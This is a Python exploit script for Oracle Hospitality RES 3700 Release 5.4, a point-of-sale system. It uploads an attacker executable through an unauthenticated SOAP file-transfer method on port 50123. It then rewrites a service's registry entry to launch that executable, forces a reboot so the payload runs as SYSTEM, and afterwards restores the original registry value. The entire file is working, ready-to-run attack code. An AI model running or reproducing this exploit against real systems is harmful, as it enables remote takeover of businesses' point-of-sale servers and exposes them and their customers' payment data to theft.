#!/usr/bin/env python

#Author: Walid Faour
#Date: Aug. 3, 2019
#Oracle Hospitality RES 3700 Release 5.4 Exploit

import binascii
import requests

print
print '-------------------------------------------------'
print 'Oracle Hospitality RES 3700 Release 5.4 - Exploit'
print '-------------------------------------------------'
print

IP = raw_input("Enter the IP address: ")
URL = "http://" + IP + ":50123"

f = open("attacker-5.4.exe",'rb')
raw_payload = f.read()
payload_hex = binascii.hexlify(raw_payload)
f.close()

body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
		<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
			<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
			<MCRS-ENV:Method>TransferFile</MCRS-ENV:Method> \
			<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
			<MCRS-ENV:InputParameters> \
				<dst>C:\\Windows\\attacker-5.4.exe</dst> \
				<fn>C:\\Windows\\attacker-5.4.exe</fn> \
				<data>' + payload_hex + '</data> \
			</MCRS-ENV:InputParameters> \
		</SOAP-ENV:Body> \
	</SOAP-ENV:Envelope>'
def header(body):
	headers = {
		"Content-Type" : "text/xml",
		"User-Agent" : "MDS POS Client",
		"Host" : IP + ":50123",
		"Content-Length" : str(len(body)),
		"Connection" : "Keep-Alive"
		}
	return headers

payload_reg = "C:\\Windows\\attacker-5.4.exe"
original_reg = "D:\\Micros\\Common\\Bin\\RunDBMS.exe"
def reg(keyval):
	body_reg = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
			<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
				<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
				<MCRS-ENV:Method>Reg_SetValue</MCRS-ENV:Method> \
				<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
				<MCRS-ENV:InputParameters> \
					<Key>SOFTWARE\\Wow6432Node\\MICROS\\3700\\3700d\\RunDBMS</Key> \
					<KeyType>HKEY_LOCAL_MACHINE</KeyType> \
					<vtype>REG_SZ</vtype> \
					<KeyName>Executable</KeyName> \
					<KeyVal>' + keyval + '</KeyVal> \
					<KOvrWrte>T</KOvrWrte> \
				</MCRS-ENV:InputParameters> \
			</SOAP-ENV:Body> \
		</SOAP-ENV:Envelope>'
	return body_reg

body_reboot = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
			<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
				<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
				<MCRS-ENV:Method>Reboot</MCRS-ENV:Method> \
				<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
					<MCRS-ENV:InputParameters> \
					</MCRS-ENV:InputParameters> \
			</SOAP-ENV:Body> \
	       </SOAP-ENV:Envelope>'


print 'Exploiting Oracle Hospitality RES 3700 at IP address ' + IP + '...'
data_reg1 = reg(payload_reg)
send_payload = requests.post(URL,data=body,headers=header(body))
set_registry1 = requests.post(URL,data=data_reg1,headers=header(data_reg1))
send_reboot = requests.post(URL,data=body_reboot,headers=header(body_reboot))
print
print 'Restarting the remote server, please wait...'
print
pause = raw_input('Press Enter when you acquire a SYSTEM shell: ')
data_reg2 = reg(original_reg)
set_registry2 = requests.post(URL,data=data_reg2,headers=header(data_reg2))
